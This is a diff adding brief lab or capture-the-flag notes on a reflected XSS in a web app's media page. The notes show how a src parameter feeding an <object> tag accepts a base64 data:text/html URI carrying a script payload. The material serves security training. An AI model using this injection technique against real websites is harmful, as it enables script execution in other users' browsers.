@@ -1,0 +1,11 @@
+on the home page we can see that just one image is clickable 
+it's redirect us to:
+http://{IP}/?page=media&src=nsa
+
+after inspecting the HTML page we find the image displayed by <Object>  instead of <img>
+And the data of the Object tag chosen by the src variable in the url : http://{IP}/?page=media&src=nsa
+<object data="http://{IP}/images/nsa_prism.jpg"></object>
+
+<script>alert(1)</script> -> converted to base64 -> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+http://{IP}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
